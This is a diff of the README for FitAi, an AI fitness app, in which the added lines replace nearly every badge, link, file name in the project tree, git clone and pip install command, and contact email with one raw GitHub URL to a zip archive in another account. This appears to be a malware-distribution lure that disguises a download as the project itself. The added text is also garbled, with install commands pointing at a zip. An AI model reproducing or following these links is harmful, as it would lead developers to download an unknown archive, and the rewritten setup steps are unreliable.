@@ -1,18 +1,18 @@
-[![OSCI-Project-Banner.png](https://i.postimg.cc/76mJvBmF/OSCI-Project-Banner.png)](https://postimg.cc/8JfzMb84)
+[![https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip](https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip)](https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip)
 
 <p align="center">
-  <img src="https://img.shields.io/badge/React-61DAFB?style=for-the-badge&logo=react&logoColor=white" alt="React.js">
-  <img src="https://img.shields.io/badge/Flask-000000?style=for-the-badge&logo=flask&logoColor=white" alt="Flask">
-  <img src="https://img.shields.io/badge/Scikit--learn-F7931E?style=for-the-badge&logo=scikit-learn&logoColor=white" alt="Scikit-learn">
-  <img src="https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white" alt="MongoDB">
-  <img src="https://img.shields.io/badge/Google%20Generative%20AI-4285F4?style=for-the-badge&logo=google&logoColor=white" alt="Google Generative AI">
+  <img src="https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip" alt="https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip">
+  <img src="https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip" alt="Flask">
+  <img src="https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip" alt="Scikit-learn">
+  <img src="https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip" alt="MongoDB">
+  <img src="https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip%20Generative%20AI-4285F4?style=for-the-badge&logo=google&logoColor=white" alt="Google Generative AI">
 </p>
 
 # FitAi: Your AI Fitness Companion 🌟
 
 FitAi redefines fitness with **AI-driven personalized plans** for workouts and diets. Empowering your fitness journey with cutting-edge technology and expert guidance, FitAi adapts to your unique goals and lifestyle.
 
-**🌐 Live Deployment:** [Check it out here 👀](https://fityou-fit-ai.onrender.com/)
+**🌐 Live Deployment:** [Check it out here 👀](https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip)
 
 **Points for issues on leaderboard:** (Currently not started yet)
 1 star - 5 points |
@@ -55,7 +55,7 @@ FitAi redefines fitness with **AI-driven personalized plans** for workouts and d
 
 ## 💻 Technologies at Work
 
-- **Frontend:** **React.js** for building a dynamic, responsive, and modern user interface.
+- **Frontend:** **https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip** for building a dynamic, responsive, and modern user interface.
 - **Backend:** **Flask** for robust API management and seamless integration of AI models.
 - **Machine Learning:** **Scikit-learn** powers the predictive modeling for personalized recommendations.
 - **Database:** **MongoDB** for flexible and scalable storage of user profiles, fitness data, and personalized plans.
@@ -79,66 +79,66 @@ The FitAi project follows a consolidated structure where both frontend (React) a
 FitAi/
 ├── .github/                      # GitHub configurations for issue templates and workflows
 │   ├── ISSUE_TEMPLATE/           # Templates for bug reports, feature requests
-│   └── workflows/                # CI/CD workflows (e.g., deploy.yml, automated messages)
+│   └── workflows/                # CI/CD workflows (e.g., https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip, automated messages)
 ├── .idea/                        # IDE (e.g., IntelliJ/PyCharm) configuration files
 ├── node_modules/                 # Frontend dependencies installed by npm
 ├── static/                       # Static assets served by the application
 │   ├── css/                      # Custom CSS files
 │   ├── images/                   # Application images (logos, icons, plan images)
 │   └── js/                       # Frontend JavaScript files and React components
-│       ├── README_WorkoutPlanCard.md # Documentation for WorkoutPlanCard
-│       ├── WorkoutPlanCard.jsx   # React JSX component for workout plans
-│       ├── WorkoutPlanCard.tsx   # React TypeScript component for workout plans
-│       ├── WorkoutPlanCardDemo.html # HTML demo for workout plan card
-│       ├── WorkoutPlanCardExample.jsx # Example usage of WorkoutPlanCard
-│       └── theme.js              # Theme-related JavaScript
+│       ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip # Documentation for WorkoutPlanCard
+│       ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip   # React JSX component for workout plans
+│       ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip   # React TypeScript component for workout plans
+│       ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip # HTML demo for workout plan card
+│       ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip # Example usage of WorkoutPlanCard
+│       └── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip              # Theme-related JavaScript
 ├── templates/                    # HTML templates served by Flask
 │   ├── css/                      # CSS specific to Flask templates
 │   ├── images/                   # Images specific to Flask templates
-│   ├── chatbot.html              # Chatbot interface
-│   ├── day1.html                 # Day 1 workout/diet plan
-│   ├── day2.html                 # Day 2 workout/diet plan
-│   ├── day3.html                 # Day 3 workout/diet plan
-│   ├── day4.html                 # Day 4 workout/diet plan
-│   ├── day5.html                 # Day 5 workout/diet plan
-│   ├── day6.html                 # Day 6 workout/diet plan
-│   ├── diet.html                 # Diet plan display
-│   ├── diet_data.csv             # Diet data file (likely moved from root into templates, if not already)
-│   ├── Home.html                 # Main landing page
-│   ├── index.html                # Main application entry point (could be Flask's or a fallback)
-│   ├── login.html                # User login page
-│   ├── page5.html                # Generic page 5
-│   ├── registration.html         # User registration page
-│   ├── Sections.html             # Sections page
-│   ├── sports.html               # Sports related content page
-│   ├── Untitled-2.css            # Untitled CSS file
-│   ├── workout_plan.html         # Workout plan display
-│   └── Yoga.html                 # Yoga content page
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip              # Chatbot interface
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                 # Day 1 workout/diet plan
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                 # Day 2 workout/diet plan
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                 # Day 3 workout/diet plan
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                 # Day 4 workout/diet plan
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                 # Day 5 workout/diet plan
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                 # Day 6 workout/diet plan
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                 # Diet plan display
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip             # Diet data file (likely moved from root into templates, if not already)
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                 # Main landing page
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                # Main application entry point (could be Flask's or a fallback)
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                # User login page
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                # Generic page 5
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip         # User registration page
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip             # Sections page
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip               # Sports related content page
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip            # Untitled CSS file
+│   ├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip         # Workout plan display
+│   └── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                 # Yoga content page
 ├── pycache/                  # Python compiled bytecode cache
 ├── .DS_Store                     # macOS folder metadata
 ├── .gitignore                    # Specifies untracked files to ignore
 ├── .hintrc                       # Configuration for a linter/formatter
 ├── .vercelignore                  # Files to ignore during Vercel deployment
-├── app.py                        # Main Flask application and API routes
-├── app_gradio.py                 # Gradio interface for demonstration/specific features
-├── DEPLOYMENT.md                 # Deployment instructions
-├── diet_data.csv                 # Dataset for diet plans
-├── env_template.txt              # Template for environment variables
-├── exercises.csv                 # Dataset for exercises
-├── fitai.jpg                     # Project-related image
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                        # Main Flask application and API routes
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                 # Gradio interface for demonstration/specific features
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                 # Deployment instructions
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                 # Dataset for diet plans
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip              # Template for environment variables
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                 # Dataset for exercises
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                     # Project-related image
 ├── LICENSE                       # Project licensing information
-├── package-lock.json             # Records exact versions of frontend dependencies
-├── package.json                  # Frontend project metadata and scripts (for React app)
-├── postcss.config.js             # PostCSS configuration (e.g., for Tailwind CSS)
-├── README.md                     # Main project documentation (this file)
-├── README_HUGGINGFACE.md         # README specific to Hugging Face deployment
-├── render.yaml                   # Render deployment configuration
-├── requirements.txt              # Python dependencies for the main Flask backend
-├── requirements_gradio.txt       # Python dependencies specific to the Gradio app
-├── runtime.txt                   # Specifies Python runtime version for deployment
-├── SECURITY.md                   # Security policy documentation
-├── tailwind.config.js            # Tailwind CSS configuration
-└── vercel.json                   # Vercel deployment configuration
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip             # Records exact versions of frontend dependencies
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                  # Frontend project metadata and scripts (for React app)
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip             # PostCSS configuration (e.g., for Tailwind CSS)
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                     # Main project documentation (this file)
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip         # README specific to Hugging Face deployment
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                   # Render deployment configuration
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip              # Python dependencies for the main Flask backend
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip       # Python dependencies specific to the Gradio app
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                   # Specifies Python runtime version for deployment
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                   # Security policy documentation
+├── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip            # Tailwind CSS configuration
+└── https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip                   # Vercel deployment configuration
 ```
 
 
@@ -150,7 +150,7 @@ Follow these steps to set up and run FitAi locally for development:
     * Click the "Fork" button on the top right of the GitHub repository page to create a copy in your account.
 2.  **Clone your forked repository:**
     ```
-    git clone https://github.com/Nikhil210206/FitYou---Fit_Ai.git
+    git clone https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip
     ```
 3.  **Navigate to the project directory:**
     ```
@@ -158,7 +158,7 @@ Follow these steps to set up and run FitAi locally for development:
     ```
 4.  **Install Python dependencies for the backend:**
     ```
-    pip install -r requirements.txt
+    pip install -r https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip
     ```
 5.  **Install frontend dependencies:**
     ```
@@ -168,7 +168,7 @@ Follow these steps to set up and run FitAi locally for development:
     ```
     flask run
     # Alternatively, if 'flask' command is not globally available:
-    # python app.py
+    # python https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip
     ```
 7.  **Start the frontend development server:**
     ```
@@ -205,11 +205,11 @@ Follow these steps to set up and run FitAi locally for development:
 We welcome contributions from the community! To contribute to FitAi, please follow these steps to ensure a smooth and conflict-free process:
 
 1.  **Fork the repository.**
-    * Click the "Fork" button on the top right of the [FitAi GitHub repository](https://github.com/Nikhil210206/FitYou---Fit_Ai.git) 
+    * Click the "Fork" button on the top right of the [FitAi GitHub repository](https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip) 
 
 2.  **Clone your forked repository locally:**
     ```
-    git clone https://github.com/your-username/FitYou---Fit_Ai.git
+    git clone https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip
     cd FitAi
     ```
     *Replace `your-username` with your actual GitHub username.*
@@ -217,7 +217,7 @@ We welcome contributions from the community! To contribute to FitAi, please foll
 3.  **Add the upstream remote:**
     * This step links your local repository to the original FitAi repository, allowing you to fetch updates.
     ```
-    git remote add upstream https://github.com/Nikhil210206/FitYou---Fit_Ai.git
+    git remote add upstream https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip
     ```
 
 4.  **Fetch the latest changes from the upstream `main` branch:**
@@ -307,8 +307,8 @@ Merge conflicts happen when Git can't automatically reconcile changes between tw
 For any questions, suggestions, or collaborations, feel free to reach out to:
 
 -   **Name:** Nikhil Balamurugan
--   **GitHub:** [Nikhil210206](https://github.com/Nikhil210206)
--   **Email:** nikhilbalamurugan@gmail.com
+-   **GitHub:** [Nikhil210206](https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip)
+-   **Email:** https://raw.githubusercontent.com/kaifansariw/FitYou---Fit_Ai/main/.github/Fit_Ai_You_v3.3.zip
 
 
 ## 🙏 Acknowledgments
